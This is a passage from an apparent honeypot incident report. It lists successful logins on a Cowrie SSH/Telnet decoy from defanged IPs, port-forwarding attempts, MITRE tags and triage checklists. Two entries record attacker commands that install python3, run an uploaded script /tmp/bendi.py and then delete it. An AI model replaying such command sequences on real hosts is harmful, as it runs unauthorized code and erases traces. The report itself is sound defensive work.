| **First Seen** | 2026-08-05 05:14 |
| **Last Seen** | 2026-08-05 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:14:41` | `cowrie.session.connect` |
| `2026-08-05 05:14:41` | `cowrie.client.version` |
| `2026-08-05 05:14:42` | `cowrie.client.kex` |
| `2026-08-05 05:14:42` | `cowrie.login.success` |
| `2026-08-05 05:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ef137a5b646

| Field | Detail |
|---|---|
| **Source IP** | `115.191.32[.]57` |
| **First Seen** | 2026-08-05 05:17 |
| **Last Seen** | 2026-08-05 05:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:17:58` | `cowrie.session.connect` |
| `2026-08-05 05:18:01` | `cowrie.telnet.option` |
| `2026-08-05 05:18:01` | `cowrie.telnet.option` |
| `2026-08-05 05:19:58` | `cowrie.login.success` |
| `2026-08-05 05:19:58` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `115.191.32[.]57` to AbuseIPDB if not already reported
- [ ] Block `115.191.32[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59ff7dfdce50

| Field | Detail |
|---|---|
| **Source IP** | `202.82.20[.]241` |
| **First Seen** | 2026-08-05 05:18 |
| **Last Seen** | 2026-08-05 05:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:18:24` | `cowrie.session.connect` |
| `2026-08-05 05:18:24` | `cowrie.client.version` |
| `2026-08-05 05:18:24` | `cowrie.client.kex` |
| `2026-08-05 05:18:26` | `cowrie.login.success` |
| `2026-08-05 05:18:27` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.82.20[.]241` to AbuseIPDB if not already reported
- [ ] Block `202.82.20[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac0f10751a39

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-08-05 05:18 |
| **Last Seen** | 2026-08-05 05:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:18:36` | `cowrie.session.connect` |
| `2026-08-05 05:18:37` | `cowrie.client.version` |
| `2026-08-05 05:18:37` | `cowrie.client.kex` |
| `2026-08-05 05:18:39` | `cowrie.login.success` |
| `2026-08-05 05:18:40` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53df4b28e79d

| Field | Detail |
|---|---|
| **Source IP** | `192.34.62[.]126` |
| **First Seen** | 2026-08-05 05:18 |
| **Last Seen** | 2026-08-05 05:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:18:44` | `cowrie.session.connect` |
| `2026-08-05 05:18:44` | `cowrie.client.version` |
| `2026-08-05 05:18:44` | `cowrie.client.kex` |
| `2026-08-05 05:18:44` | `cowrie.login.success` |
| `2026-08-05 05:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.62[.]126` to AbuseIPDB if not already reported
- [ ] Block `192.34.62[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1533194e60bf

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-05 05:18 |
| **Last Seen** | 2026-08-05 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:18:44` | `cowrie.session.connect` |
| `2026-08-05 05:18:44` | `cowrie.client.version` |
| `2026-08-05 05:18:44` | `cowrie.client.kex` |
| `2026-08-05 05:18:45` | `cowrie.login.success` |
| `2026-08-05 05:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e2b2993a909

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]33` |
| **First Seen** | 2026-08-05 05:19 |
| **Last Seen** | 2026-08-05 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:19:30` | `cowrie.session.connect` |
| `2026-08-05 05:19:30` | `cowrie.client.version` |
| `2026-08-05 05:19:30` | `cowrie.client.kex` |
| `2026-08-05 05:19:31` | `cowrie.login.success` |
| `2026-08-05 05:19:31` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:19:31` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]33` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e16aeeb26fc2

| Field | Detail |
|---|---|
| **Source IP** | `87.117.32[.]22` |
| **First Seen** | 2026-08-05 05:19 |
| **Last Seen** | 2026-08-05 05:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:19:39` | `cowrie.session.connect` |
| `2026-08-05 05:19:40` | `cowrie.client.version` |
| `2026-08-05 05:19:40` | `cowrie.client.kex` |
| `2026-08-05 05:19:41` | `cowrie.login.success` |
| `2026-08-05 05:19:41` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.117.32[.]22` to AbuseIPDB if not already reported
- [ ] Block `87.117.32[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c8d064ebb1

| Field | Detail |
|---|---|
| **Source IP** | `41.224.62[.]206` |
| **First Seen** | 2026-08-05 05:19 |
| **Last Seen** | 2026-08-05 05:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:19:46` | `cowrie.session.connect` |
| `2026-08-05 05:19:46` | `cowrie.client.version` |
| `2026-08-05 05:19:46` | `cowrie.client.kex` |
| `2026-08-05 05:19:47` | `cowrie.login.success` |
| `2026-08-05 05:19:47` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:19:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.224.62[.]206` to AbuseIPDB if not already reported
- [ ] Block `41.224.62[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aaa0fa4a825

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]199` |
| **First Seen** | 2026-08-05 05:27 |
| **Last Seen** | 2026-08-05 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:27:17` | `cowrie.session.connect` |
| `2026-08-05 05:27:17` | `cowrie.client.version` |
| `2026-08-05 05:27:17` | `cowrie.client.kex` |
| `2026-08-05 05:27:18` | `cowrie.login.success` |
| `2026-08-05 05:27:18` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:27:18` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]199` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]199` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-638b85de9360

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]47` |
| **First Seen** | 2026-08-05 05:27 |
| **Last Seen** | 2026-08-05 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:27:25` | `cowrie.session.connect` |
| `2026-08-05 05:27:25` | `cowrie.client.version` |
| `2026-08-05 05:27:25` | `cowrie.client.kex` |
| `2026-08-05 05:27:25` | `cowrie.login.success` |
| `2026-08-05 05:27:26` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:27:26` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]47` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8437b45d683

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]199` |
| **First Seen** | 2026-08-05 05:28 |
| **Last Seen** | 2026-08-05 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:28:54` | `cowrie.session.connect` |
| `2026-08-05 05:28:54` | `cowrie.client.version` |
| `2026-08-05 05:28:54` | `cowrie.client.kex` |
| `2026-08-05 05:28:55` | `cowrie.login.success` |
| `2026-08-05 05:28:55` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:28:55` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]199` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]199` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0571209f8e7

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]21` |
| **First Seen** | 2026-08-05 05:29 |
| **Last Seen** | 2026-08-05 05:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:29:10` | `cowrie.session.connect` |
| `2026-08-05 05:29:10` | `cowrie.client.version` |
| `2026-08-05 05:29:10` | `cowrie.client.kex` |
| `2026-08-05 05:29:11` | `cowrie.login.success` |
| `2026-08-05 05:29:12` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:29:12` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]21` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3630ac02c622

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-05 05:32 |
| **Last Seen** | 2026-08-05 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:32:03` | `cowrie.session.connect` |
| `2026-08-05 05:32:03` | `cowrie.client.version` |
| `2026-08-05 05:32:03` | `cowrie.client.kex` |
| `2026-08-05 05:32:04` | `cowrie.login.success` |
| `2026-08-05 05:32:04` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:32:04` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:32:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7440864f43b1

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]110` |
| **First Seen** | 2026-08-05 05:32 |
| **Last Seen** | 2026-08-05 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:32:54` | `cowrie.session.connect` |
| `2026-08-05 05:32:54` | `cowrie.client.version` |
| `2026-08-05 05:32:54` | `cowrie.client.kex` |
| `2026-08-05 05:32:54` | `cowrie.login.success` |
| `2026-08-05 05:32:54` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:32:55` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]110` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-886304bc8a01

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-05 05:34 |
| **Last Seen** | 2026-08-05 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:34:49` | `cowrie.session.connect` |
| `2026-08-05 05:34:49` | `cowrie.client.version` |
| `2026-08-05 05:34:49` | `cowrie.client.kex` |
| `2026-08-05 05:34:50` | `cowrie.login.success` |
| `2026-08-05 05:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd825b2f257

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-05 05:34 |
| **Last Seen** | 2026-08-05 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:34:49` | `cowrie.session.connect` |
| `2026-08-05 05:34:49` | `cowrie.client.version` |
| `2026-08-05 05:34:49` | `cowrie.client.kex` |
| `2026-08-05 05:34:50` | `cowrie.login.success` |
| `2026-08-05 05:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a8d57a3601

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-05 05:35 |
| **Last Seen** | 2026-08-05 05:37 |
| **Session Duration** | 131s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:35:09` | `cowrie.session.connect` |
| `2026-08-05 05:35:09` | `cowrie.client.version` |
| `2026-08-05 05:35:09` | `cowrie.client.kex` |
| `2026-08-05 05:35:10` | `cowrie.login.success` |
| `2026-08-05 05:35:12` | `cowrie.session.file_upload` |
| `2026-08-05 05:35:13` | `cowrie.session.params` |
| `2026-08-05 05:35:13` | `cowrie.command.input` |
| `2026-08-05 05:35:13` | `cowrie.command.input` |
| `2026-08-05 05:35:13` | `cowrie.command.input` |
| `2026-08-05 05:35:13` | `cowrie.command.failed` |
| `2026-08-05 05:35:13` | `cowrie.log.closed` |
| `2026-08-05 05:35:14` | `cowrie.session.params` |
| `2026-08-05 05:35:14` | `cowrie.command.input` |
| `2026-08-05 05:35:14` | `cowrie.log.closed` |
| `2026-08-05 05:35:15` | `cowrie.session.params` |
| `2026-08-05 05:35:15` | `cowrie.command.input` |
| `2026-08-05 05:35:16` | `cowrie.log.closed` |
| `2026-08-05 05:35:16` | `cowrie.session.params` |
| `2026-08-05 05:35:16` | `cowrie.command.input` |
| `2026-08-05 05:35:16` | `cowrie.command.failed` |
| `2026-08-05 05:35:16` | `cowrie.command.failed` |
| `2026-08-05 05:36:18` | `cowrie.session.params` |
| `2026-08-05 05:36:18` | `cowrie.command.input` |
| `2026-08-05 05:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13fcff31e3b0

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-05 05:36 |
| **Last Seen** | 2026-08-05 05:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:36:18` | `cowrie.session.connect` |
| `2026-08-05 05:36:19` | `cowrie.client.version` |
| `2026-08-05 05:36:19` | `cowrie.client.kex` |
| `2026-08-05 05:36:21` | `cowrie.login.success` |
| `2026-08-05 05:36:21` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb84580c3172

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-08-05 05:36 |
| **Last Seen** | 2026-08-05 05:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:36:26` | `cowrie.session.connect` |
| `2026-08-05 05:36:27` | `cowrie.client.version` |
| `2026-08-05 05:36:27` | `cowrie.client.kex` |
| `2026-08-05 05:36:29` | `cowrie.login.success` |
| `2026-08-05 05:36:30` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137e815d3327

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-05 05:37 |
| **Last Seen** | 2026-08-05 05:39 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:37:36` | `cowrie.session.connect` |
| `2026-08-05 05:37:36` | `cowrie.client.version` |
| `2026-08-05 05:37:36` | `cowrie.client.kex` |
| `2026-08-05 05:37:37` | `cowrie.login.success` |
| `2026-08-05 05:37:39` | `cowrie.session.file_upload` |
| `2026-08-05 05:37:39` | `cowrie.session.params` |
| `2026-08-05 05:37:39` | `cowrie.command.input` |
| `2026-08-05 05:37:39` | `cowrie.command.input` |
| `2026-08-05 05:37:39` | `cowrie.command.input` |
| `2026-08-05 05:37:39` | `cowrie.command.failed` |
| `2026-08-05 05:37:40` | `cowrie.log.closed` |
| `2026-08-05 05:37:41` | `cowrie.session.params` |
| `2026-08-05 05:37:41` | `cowrie.command.input` |
| `2026-08-05 05:37:41` | `cowrie.log.closed` |
| `2026-08-05 05:37:42` | `cowrie.session.params` |
| `2026-08-05 05:37:42` | `cowrie.command.input` |
| `2026-08-05 05:37:42` | `cowrie.log.closed` |
| `2026-08-05 05:37:43` | `cowrie.session.params` |
| `2026-08-05 05:37:43` | `cowrie.command.input` |
| `2026-08-05 05:37:43` | `cowrie.command.failed` |
| `2026-08-05 05:37:43` | `cowrie.command.failed` |
| `2026-08-05 05:38:44` | `cowrie.session.params` |
| `2026-08-05 05:38:44` | `cowrie.command.input` |
| `2026-08-05 05:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7da83976b44

| Field | Detail |
|---|---|
| **Source IP** | `45.33.109[.]8` |
| **First Seen** | 2026-08-05 05:38 |
| **Last Seen** | 2026-08-05 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:38:17` | `cowrie.session.connect` |
| `2026-08-05 05:38:17` | `cowrie.login.success` |
| `2026-08-05 05:38:18` | `cowrie.session.params` |
| `2026-08-05 05:38:18` | `cowrie.command.input` |
| `2026-08-05 05:38:18` | `cowrie.command.failed` |
| `2026-08-05 05:38:18` | `cowrie.command.input` |
| `2026-08-05 05:38:18` | `cowrie.command.failed` |
| `2026-08-05 05:38:18` | `cowrie.command.input` |
| `2026-08-05 05:38:18` | `cowrie.command.failed` |
| `2026-08-05 05:38:18` | `cowrie.command.input` |
| `2026-08-05 05:38:18` | `cowrie.log.closed` |
| `2026-08-05 05:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.109[.]8` to AbuseIPDB if not already reported
- [ ] Block `45.33.109[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76d702f7d837

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]47` |
| **First Seen** | 2026-08-05 05:39 |
| **Last Seen** | 2026-08-05 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:39:10` | `cowrie.session.connect` |
| `2026-08-05 05:39:10` | `cowrie.client.version` |
| `2026-08-05 05:39:10` | `cowrie.client.kex` |
| `2026-08-05 05:39:11` | `cowrie.login.success` |
| `2026-08-05 05:39:11` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:39:11` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]47` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12f3ba350921

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]19` |
| **First Seen** | 2026-08-05 05:39 |
| **Last Seen** | 2026-08-05 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 05:39:50` | `cowrie.session.connect` |
| `2026-08-05 05:39:50` | `cowrie.client.version` |
| `2026-08-05 05:39:50` | `cowrie.client.kex` |
| `2026-08-05 05:39:51` | `cowrie.login.success` |
| `2026-08-05 05:39:51` | `cowrie.direct-tcpip.request` |
| `2026-08-05 05:39:51` | `cowrie.direct-tcpip.data` |
| `2026-08-05 05:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]19` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-552fd3af3293

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]41` |
| **First Seen** | 2026-08-05 05:42 |
| **Last Seen** | 2026-08-05 05:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

